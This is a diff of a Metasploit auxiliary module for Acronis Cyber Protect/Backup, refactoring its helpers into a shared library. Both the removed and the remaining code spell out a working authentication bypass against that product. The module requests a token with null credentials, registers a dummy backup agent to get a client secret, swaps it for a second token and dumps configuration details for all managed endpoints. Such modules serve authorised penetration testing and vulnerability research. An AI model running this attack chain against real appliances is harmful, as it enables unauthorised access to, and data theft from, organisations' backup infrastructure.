@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::AcronisCyber
 
   def initialize(info = {})
     super(
@@ -66,88 +67,8 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # return first access_token or nil if not successful
-  def get_access_token1
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
-      'ctype' => 'application/x-www-form-urlencoded',
-      'headers' => {
-        'X-Requested-With' => 'XMLHttpRequest'
-      },
-      'vars_post' => {
-        'grant_type' => 'password',
-        'username' => nil,
-        'password' => nil
-      }
-    })
-    return unless res&.code == 200
-    return unless res.body.include?('access_token')
-
-    # parse json response and return access_token
-    res_json = res.get_json_document
-    return if res_json.blank?
-
-    res_json['access_token']
-  end
-
-  # register a dummy agent in Acronis Cyber Protect 12.5 and 15.0
-  # returns the client_secret if successful otherwise nil
-  def dummy_agent_registration(client_id)
-    name = Rex::Text.rand_text_alphanumeric(5..8).downcase
-    post_data = {
-      client_id: client_id.to_s,
-      data: { agent_type: 'backupAgent', hostname: name.to_s, is_transient: true },
-      tenant_id: nil,
-      token_endpoint_auth_method: 'client_secret_basic',
-      type: 'agent'
-    }.to_json
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'api', 'account_server', 'v2', 'clients'),
-      'ctype' => 'application/json',
-      'headers' => {
-        'X-Requested-With' => 'XMLHttpRequest',
-        'Authorization' => "bearer #{@access_token1}"
-      },
-      'data' => post_data.to_s
-    })
-    return unless res&.code == 201 && res.body.include?('client_id') && res.body.include?('client_secret')
-
-    # parse json response and return client_secret
-    res_json = res.get_json_document
-    return if res_json.blank?
-
-    res_json['client_secret']
-  end
-
-  # return second access_token or nil if not successful
-  def get_access_token2(client_id, client_secret)
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'idp', 'token'),
-      'ctype' => 'application/x-www-form-urlencoded',
-      'headers' => {
-        'X-Requested-With' => 'XMLHttpRequest'
-      },
-      'vars_post' => {
-        'grant_type' => 'client_credentials',
-        'client_id' => client_id.to_s,
-        'client_secret' => client_secret.to_s
-      }
-    })
-    return unless res&.code == 200
-    return unless res.body.include?('access_token')
-
-    # parse json response and return access_token
-    res_json = res.get_json_document
-    return if res_json.blank?
-
-    res_json['access_token']
-  end
-
   # return all configured items in json format or return nil if not successful
-  def get_machine_info
+  def get_machine_info(access_token2)
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'resources'),
@@ -155,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
       'keep_cookies' => true,
       'headers' => {
         'X-Requested-With' => 'XMLHttpRequest',
-        'Authorization' => "bearer #{@access_token2}"
+        'Authorization' => "bearer #{access_token2}"
       },
       'vars_get' => {
         'embed' => 'details'
@@ -176,71 +97,37 @@ class MetasploitModule < Msf::Auxiliary
     res_json
   end
 
-  # return version information or nil if not successful
-  def get_version_info
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'api', 'ams', 'versions'),
-      'ctype' => 'application/json',
-      'headers' => {
-        'X-Requested-With' => 'XMLHttpRequest',
-        'Authorization' => "bearer #{@access_token2}"
-      }
-    })
-    return unless res&.code == 200
-    return unless res.body.include?('backendVersion')
-
-    # parse json response and get the relevant machine info
-    res_json = res.get_json_document
-    return if res_json.blank?
-
-    res_json['backendVersion']
-  end
-
-  # check if the target is running the acronis protect/backup and return the version information.
-  def get_acronis_cyber_protect_version
+  def check
     # initial check on api access
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'api', 'meta'),
       'ctype' => 'application/json'
     })
-    return unless res&.code == 200 && res.body.include?('uri') && res.body.include?('method')
+    return Exploit::CheckCode::Unknown('No Acronis API access found!') unless res&.code == 200 && res.body.include?('uri') && res.body.include?('method')
 
     # get first access token
     print_status('Retrieve the first access token.')
     @access_token1 = get_access_token1
     vprint_status("Extracted first access token: #{@access_token1}")
-    if @access_token1.nil?
-      print_warning('Retrieval of the first access token failed.')
-      return nil
-    end
+    return Exploit::CheckCode::Unknown('Retrieval of the first access token failed.') if @access_token1.nil?
 
     # register a dummy agent
     client_id = SecureRandom.uuid
     print_status('Register a dummy backup agent.')
-    client_secret = dummy_agent_registration(client_id)
-    if client_secret.nil?
-      print_warning('Registering a dummy agent failed.')
-      return nil
-    end
+    client_secret = dummy_agent_registration(client_id, @access_token1)
+    return Exploit::CheckCode::Unknown('Registering a dummy agent failed.') if client_secret.nil?
+
     print_status('Dummy backup agent registration is successful.')
 
     # get second access_token
     print_status('Retrieve the second access token.')
     @access_token2 = get_access_token2(client_id, client_secret)
     vprint_status("Extracted second access token: #{@access_token2}")
-    if @access_token2.nil?
-      print_warning('Retrieval of the second  access token failed.')
-      return nil
-    end
+    return Exploit::CheckCode::Unknown('Retrieval of the second  access token failed.') if @access_token2.nil?
 
     # get version info
-    get_version_info
-  end
-
-  def check
-    version = get_acronis_cyber_protect_version
+    version = get_version_info(@access_token2)
     return Exploit::CheckCode::Unknown('Can not find any version information.') if version.nil?
 
     release = version.match(/(.+)\.(\d+)/)
@@ -274,7 +161,7 @@ class MetasploitModule < Msf::Auxiliary
       # register a dummy agent
       client_id = SecureRandom.uuid
       print_status('Register a dummy backup agent.')
-      client_secret = dummy_agent_registration(client_id)
+      client_secret = dummy_agent_registration(client_id, @access_token1)
       fail_with(Failure::BadConfig, 'Registering a dummy agent failed.') if client_secret.nil?
       print_status('Dummy backup agent registration is successful.')
 
@@ -301,7 +188,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     # get all the managed endpoint configuration info
     print_status('Retrieve all managed endpoint configuration details registered at the Acronis Cyber Protect/Backup appliance.')
-    res_json = get_machine_info
+    res_json = get_machine_info(@access_token2)
     fail_with(Failure::NotFound, 'Can not find any configuration information.') if res_json.nil?
 
     # print all the managed endpoint information to the console
